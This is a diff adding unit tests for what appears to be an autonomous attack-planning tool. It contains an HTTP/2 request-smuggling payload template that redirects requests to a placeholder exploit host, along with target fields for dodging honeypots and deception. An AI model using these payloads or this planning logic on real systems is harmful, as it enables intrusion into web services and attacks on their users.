@@ -7,6 +7,7 @@ import unittest
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import planner  # noqa: E402
+from research.knowledge_base import add_universal_key  # noqa: E402
 
 
 class TestPlanner(unittest.TestCase):
@@ -114,6 +115,69 @@ class TestPlanner(unittest.TestCase):
         self.assertEqual(cfg["adaptive"]["mode"], "strike")
         self.assertEqual(len(cfg["jobs"]), 1)
         self.assertEqual(cfg["jobs"][0]["metadata"]["adaptive"]["action"], "strike")
+
+    def test_adaptive_mode_uses_learned_weights_with_autonomous_provenance(self):
+        from research.self_learning import ExperienceLearner, local_simulations
+
+        with tempfile.TemporaryDirectory() as tmp:
+            weights_path = os.path.join(tmp, "learned_weights.json")
+            with open(weights_path, "w", encoding="utf-8") as handle:
+                json.dump(ExperienceLearner().fit(local_simulations()), handle)
+            target = {
+                "target": "lab.example.test",
+                "is_honeypot": False,
+                "deception_risk": "low",
+                "tech": ["h2"],
+                "exploit_host": "exploit.example.test",
+                "known_ports": [443],
+            }
+            cfg = planner.build_daemon_config(
+                [target],
+                adaptive=True,
+                learned_weights=weights_path,
+                learned_max_hypotheses=1,
+            )
+
+        inferred = [
+            j for j in cfg["jobs"]
+            if j.get("metadata", {}).get("provenance") == "autonomous-inferred"
+        ]
+        self.assertEqual(len(inferred), 1)
+        job = inferred[0]
+        self.assertEqual(job["probe"], "h2-cl")
+        self.assertEqual(job["tls"], "h2")
+        self.assertIn("GET /resources HTTP/1.1", job["body"])
+        self.assertIn("Content-Length: 5", job["body"])
+        self.assertNotIn("solution-derived", json.dumps(job))
+        summary = cfg["adaptive"]["autonomous_inference"]["targets"][0]
+        self.assertEqual(summary["parameters"][0]["smuggled_path"], "/resources")
+
+    def test_h2_cl_playbook_skipped_without_exploit_host(self):
+        vault = {"version": 1, "keys": []}
+        add_universal_key(
+            vault,
+            raw_payload=b"GET /resources HTTP/1.1\r\nHost: {{EXPLOIT_HOST}}\r\n\r\n",
+            mutation_type="playbook:h2-cl-resources-redirect",
+            protocol_edge="h2->h1.1",
+            tech_stack=["h2"],
+            technique="h2-cl",
+            tls="h2",
+            job_overrides={
+                "probe": "h2-cl",
+                "tls": "h2",
+                "body": "GET /resources HTTP/1.1\r\nHost: {{EXPLOIT_HOST}}\r\nContent-Length: 5\r\n\r\nx=1",
+                "skip_victim": False,
+            },
+        )
+        target = {
+            "target": "edge.example.com",
+            "known_ports": [443],
+            "tech": ["nginx", "h2"],
+            "is_honeypot": False,
+            "deception_risk": "low",
+        }
+        jobs = planner.plan_target(target, vault=vault)
+        self.assertNotIn("h2-cl", [j["probe"] for j in jobs])
 
 
 if __name__ == "__main__":
